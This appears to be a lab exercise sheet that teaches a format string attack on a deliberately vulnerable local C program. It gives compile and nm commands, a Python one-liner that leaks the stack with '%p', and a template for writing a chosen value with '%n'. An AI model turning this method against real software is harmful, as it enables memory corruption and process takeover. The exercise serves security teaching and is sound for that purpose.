Exercise 04 — Format String Attack
=====================================

No overflow this time.
User input is passed directly to printf() without a format string.
This lets you read and write arbitrary memory.

A global variable `secret` holds the value 0x4242.
Change it to 0x1337 to win.

  Compile:
    gcc -no-pie -o target target.c

  Find the address of secret:
    nm target | grep secret

  Leak the stack with %p to find your input's position:
    python3 -c "print('AAAA' + '.%p' * 20)" | ./target
    Look for 0x41414141 in the output — that index is yours.

  Write 0x1337 (4919) to the address of secret using %n:
    [8-byte address of secret] + [padding] + %INDEX$n

When you see [SUCCESS], run `horizon done`.
